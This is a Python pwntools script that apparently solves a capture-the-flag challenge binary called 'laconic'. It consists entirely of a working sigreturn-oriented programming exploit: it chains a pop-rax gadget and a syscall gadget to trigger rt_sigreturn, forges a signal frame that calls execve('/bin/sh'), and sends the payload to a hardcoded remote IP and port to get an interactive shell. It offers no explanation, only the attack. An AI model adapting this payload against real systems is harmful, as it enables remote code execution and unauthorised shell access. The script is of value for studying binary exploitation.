#!/usr/bin/env python3

from pwn import *

exe = ELF("./laconic")

context.binary = exe
gdb_script = '''
b *_start
b *_start+25
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("94.237.51.14", 37257)

    return r


def main():
    r = conn()
    pop_rax = 0x43018     
    syscall = 0x43015        
    bin_sh_addr = 0x43238
    
    log.info(f"/bin/sh @ {bin_sh_addr}")
    
    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = bin_sh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall 


    payload = b"A" * 8       
    payload += p64(pop_rax)
    payload += p64(15)
    payload += p64(syscall)
    payload += bytes(frame)
    
    r.sendline(payload)
    
    r.interactive()


if __name__ == "__main__":
    main()
